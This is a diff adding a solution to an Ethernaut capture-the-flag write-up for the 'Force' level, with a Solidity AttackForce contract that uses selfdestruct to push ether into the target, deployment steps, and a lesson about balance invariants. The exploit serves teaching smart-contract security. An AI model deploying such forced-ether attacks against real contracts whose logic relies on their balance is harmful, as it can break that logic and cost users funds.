@@ -4,8 +4,8 @@
 3. [Coin Flip](#3-coin-flip)
 4. [Telephone](#4-telephone)
 5. [Token](#5-token)
-6. [Delegation]
-7. [Force]
+6. [Delegation](#6-delegation)
+7. [Force](#7-force)
 8. [Vault]
 9. [King]
 10. [Re-entrancy]
@@ -403,5 +403,26 @@ contract Force {/*
 ```
 ### Solution
 ##### Explanation
+There are two ways to send ether to a contract without their permission. One is via the coinbase account where the miner provide contract address instead of theirs to get minning reward. Another way is through `selfdestruct`.\
+When a contract selfdestruct, it can provide an address to send the balance in it. By creating a contract with balance and self destructing it by providing the instance address will clear this challenge.
 ##### Exploit
+```
+contract AttackForce {
+    Force public target;
+
+    constructor(Force _target) payable {
+        target = _target;
+    }
+
+    function attack() external {
+        selfdestruct(payable(address(target)));
+        assert(address(target).balance > 0);
+    }
+}
+```
+1. Deploy above contract with 1 wei.
+2. Call `attack()` to selfdestruct and send the balance to `Force` contract.\
+That's it, now `Force` contract have non zero balance (you can check it in etherscan).
 ##### Takeaway from Ethernaut
+In solidity, for a contract to be able to receive ether, the fallback function must be marked payable.\
+However, there is no way to stop an attacker from sending ether to a contract by self-destroying. Hence, it is important not to count on the invariant address(this).balance == 0 for any contract logic.
